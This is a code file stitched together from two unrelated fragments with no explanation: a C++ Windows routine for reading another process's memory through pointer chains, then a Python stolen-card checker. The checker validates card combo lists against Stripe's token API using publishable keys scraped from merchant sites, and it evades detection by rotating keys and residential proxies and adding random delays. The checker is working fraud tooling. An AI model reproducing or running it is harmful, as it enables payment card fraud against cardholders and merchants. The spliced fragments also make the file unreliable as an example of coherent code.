#include <windows.h>
#include <psapi.h>

DWORD_PTR find_module_base(DWORD pid, const wchar_t* mod_name) {
    HMODULE mods[1024]; DWORD needed;
    HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!proc) return 0;
    if (EnumProcessModules(proc, mods, sizeof(mods), &needed)) {
        for (unsigned i = 0; i < needed / sizeof(HMODULE); i++) {
            wchar_t name[MAX_PATH];
            if (GetModuleBaseNameW(proc, mods[i], name, MAX_PATH) && !_wcsicmp(name, mod_name))
                return (DWORD_PTR)mods[i];
        }
    }
    return 0;
}

DWORD_PTR walk_chain(HANDLE proc, DWORD_PTR base, const DWORD* offsets, size_t count) {
    DWORD_PTR addr = base;
    for (size_t i = 0; i < count; i++) {
        if (!ReadProcessMemory(proc, (LPCVOID)addr, &addr, sizeof(addr), nullptr)) return 0;
        addr += offsets[i];
    }
    return addr;
}

# language: Python 3, file: cc_check.py, runtime: requests + proxies
# *pk_live keys scraped from merchant JS get flagged fast — pool and rotate. residential proxies mandatory*
import requests, time, random, json
from typing import Dict, List, Optional

def luhn_valid(pan: str) -> bool:
    digits = [int(d) for d in pan if d.isdigit()]
    checksum = 0
    for i, d in enumerate(reversed(digits)):
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        checksum += d
    return checksum % 10 == 0

def check_card(pan: str, exp_month: str, exp_year: str, cvc: str, pk_live: str, merchant_origin: str, proxy: Optional[str]) -> Dict:
    if not luhn_valid(pan):
        return {"status": "dead", "reason": "luhn_fail", "code": None}
    headers = {
        "Authorization": f"Bearer {pk_live}",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": merchant_origin,
        "Referer": f"{merchant_origin}/checkout",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    data = {
        "card[number]": pan,
        "card[exp_month]": exp_month,
        "card[exp_year]": exp_year,
        "card[cvc]": cvc,
    }
    proxies = {"https": proxy} if proxy else None
    try:
        r = requests.post("https://api.stripe.com/v1/tokens", headers=headers, data=data, proxies=proxies, timeout=15)
        resp = r.json()
        if "id" in resp and resp["id"].startswith("tok_"):
            return {"status": "live", "reason": "tokenized", "code": None, "token": resp["id"]}
        if "error" in resp:
            err = resp["error"]
            code = err.get("decline_code") or err.get("code")
            if code == "insufficient_funds":
                return {"status": "live", "reason": "insufficient_funds", "code": code}
            elif code in ("do_not_honor", "generic_decline", "lost_card", "stolen_card", "pickup_card"):
                return {"status": "dead", "reason": code, "code": code}
            elif code in ("incorrect_cvc", "expired_card", "incorrect_number", "invalid_expiry_month", "invalid_expiry_year"):
                return {"status": "dead", "reason": code, "code": code}
            else:
                return {"status": "unknown", "reason": err.get("message", "unknown_error"), "code": code}
        return {"status": "unknown", "reason": "unexpected_response", "code": None}
    except requests.exceptions.RequestException as e:
        return {"status": "error", "reason": str(e), "code": None}

def run_checker(combo_file: str, pk_live_pool: List[str], merchant_origin: str, proxy_pool: List[str], output_file: str):
    pk_idx = 0
    fails_this_key = 0
    with open(combo_file) as f, open(output_file, "a") as out:
        for line in f:
            line = line.strip()
            if not line or "|" not in line: continue
            parts = line.split("|")
            if len(parts) < 4: continue
            pan, exp_month, exp_year, cvc = parts[0], parts[1], parts[2], parts[3]
            pk = pk_live_pool[pk_idx % len(pk_live_pool)]
            proxy = random.choice(proxy_pool) if proxy_pool else None
            result = check_card(pan, exp_month, exp_year, cvc, pk, merchant_origin, proxy)
            if result["status"] == "dead":
                fails_this_key += 1
                if fails_this_key > 10:
                    pk_idx += 1
                    fails_this_key = 0
            else:
                fails_this_key = 0
            out.write(f"{line} -> {json.dumps(result)}\n")
            out.flush()
            time.sleep(random.uniform(2, 5))
```
